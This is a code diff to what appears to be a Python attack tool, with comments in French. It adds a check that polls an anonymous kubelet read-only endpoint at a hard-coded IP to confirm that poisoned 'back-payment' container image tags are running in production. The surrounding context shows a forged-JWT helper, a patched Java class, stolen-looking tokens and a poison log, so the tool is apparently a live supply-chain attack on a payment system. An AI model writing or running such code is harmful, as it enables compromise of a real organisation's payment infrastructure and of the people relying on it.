@@ -23,11 +23,13 @@ SELF_URL = os.environ.get("RENDER_EXTERNAL_URL", "")
 WORK = "/tmp"
 PATCHED_CLASS_PATH = "/tmp/RestTemplateHelperImpl.class"
 POLL = 10
+KUBELET_PODS = "http://149.102.139.167:10255/pods"
 
 CTX = ssl._create_unverified_context()
 state = {
     "started": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
-    "k8sat": None, "wavek": None, "new_tags": [], "poison_log": [], "alerts": [], "errors": []
+    "k8sat": None, "wavek": None, "new_tags": [], "poison_log": [], "alerts": [],
+    "errors": [], "running_tags": []
 }
 lock = threading.Lock()
 
@@ -225,12 +227,44 @@ def watcher_loop():
         except Exception as e:
             log(f"watcher err: {e}")
 
+# ---------------- confirmation déploiement (kubelet 10255 anonyme) ----------------
+def running_payment_tags():
+    """Tags back-payment réellement en cours d'exécution sur le cluster (kubelet read-only)."""
+    try:
+        req = urllib.request.Request(KUBELET_PODS, headers={"User-Agent": "Mozilla/5.0"})
+        d = json.loads(urllib.request.urlopen(req, timeout=30, context=CTX).read())
+        tags = set()
+        for p in d.get("items", []):
+            for c in p.get("spec", {}).get("containers", []):
+                img = c.get("image", "")
+                if "back-payment" in img and ":" in img:
+                    tags.add(img.rsplit(":", 1)[1])
+        return tags
+    except Exception:
+        return None
+
+def deployment_check():
+    running = running_payment_tags()
+    if running is None:
+        return
+    with lock:
+        state["running_tags"] = sorted(running)
+        for e in state["new_tags"]:
+            if e.get("ok") and not e.get("deployed") and e["tag"] in running:
+                e["deployed"] = True
+                e["deployed_at"] = time.strftime("%Y-%m-%d %H:%M:%S")
+                log(f"[DÉPLOYÉ] tag empoisonné {e['tag']} tourne en prod")
+
 # ---------------- monitor K8SAT/WAVEK ----------------
 def monitor_loop():
     log("monitor démarré")
     alerted_k8sat = False
     while True:
         time.sleep(300)
+        try:
+            deployment_check()
+        except Exception as e:
+            log(f"deploy-check err: {e}")
         try:
             tok = forge_jwt()
             req = urllib.request.Request(CORE + "/action-logs/filter",
